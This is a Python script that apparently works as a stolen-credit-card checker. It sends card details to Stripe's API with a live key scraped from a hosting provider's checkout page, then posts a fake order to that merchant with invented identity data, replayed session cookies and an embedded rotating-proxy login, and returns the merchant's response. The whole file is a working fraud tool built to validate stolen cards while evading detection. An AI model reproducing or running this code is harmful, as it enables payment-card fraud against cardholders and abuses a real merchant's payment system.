import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def Tele(ccx):
    proxy_str = "rp.proxyscrape.com:6060:2lr7zbclw0yxb9i:oehhbybk0arm0xn"
    proxy_parts = proxy_str.split(":")
    ip = proxy_parts[0]
    port = proxy_parts[1]
    user = proxy_parts[2]
    pass1 = proxy_parts[3]
    main_proxy = f'http://{user}:{pass1}@{ip}:{port}'
   
    session = requests.Session()
    session.proxies = {'http': main_proxy, 'https': main_proxy}
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]

    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b80e14a2-8d25-4481-99f1-7505dc68df503f308b&muid=fda69a7e-1779-431f-82b8-8dcfd8b7a6d0ac43da&sid=93f9984a-6a5b-4364-a714-f8dde7787ef8e78910&pasted_fields=number&payment_user_agent=stripe.js%2F8268afb0eb%3B+stripe-js-v3%2F8268afb0eb%3B+split-card-element&referrer=https%3A%2F%2Fmy.hosteons.com&time_on_page=116053&key=pk_live_4YVhXmI4go7VR1j9zJ77oDSR'
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
    except:
       return '#'
    

    cookies = {
        "__stripe_mid": "fda69a7e-1779-431f-82b8-8dcfd8b7a6d0ac43da",
    "__stripe_sid": "93f9984a-6a5b-4364-a714-f8dde7787ef8e78910",
    "_ga": "GA1.1.1305338624.1696920573",
    "_ga_VFTZ1Y3H6T": "GS1.1.1696920573.1.1.1696920830.0.0.0",
    "cf_clearance": "7RRxtOMCD7LKhc0LOU08BGyFPfs6yDX.enw2HP56uEo-1696920577-0-1-4182dbbf.4091e3cd.61a6eac7-0.2.1696920577",
    "WHMCSrrhmEYdKzz2F": "5vgpec2lv48m51l7oftf3v1k28"
    }


    url = "https://my.hosteons.com/index.php?rp=/stripe/payment/intent"
    headers1 = {
        'authority': 'my.hosteons.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://my.hosteons.com',
        'referer': 'https://my.hosteons.com/cart.php?a=checkout&e=false',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    data2 = {
    "accepttos": "on",
    "address1": "7104 NW Prairie View Rd",
    "address2": "",
    "applycredit": "1",
    "ccdescription": "",
    "ccinfo": "new",
    "city": "Kansas City",
    "companyname": "Mobile",
    "country": "US",
    "country-calling-code-phonenumber": "1",
    "custtype": "new",
    "email": "thih09089@bugfoo.com",
    "firstname": "Rickey",
    "lastname": "Fadel",
    "loginemail": "",
    "loginpassword": "",
    "marketingoptin": "1",
    "notes": "",
    "password": "Tagiharima28@@Tagiharima28@@",
    "password2": "Tagiharima28@@Tagiharima28@@",
    "payment_method_id": id,
    "paymentmethod": "stripe",
    "phonenumber": "816-584-8801",
    "postcode": "64151",
    "state": "Mississippi",
    "submit": "true",
    "token": "db38a5b65cab2c4612101d38f50597b2c96f6d71"
    }
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
    
    
print("working")
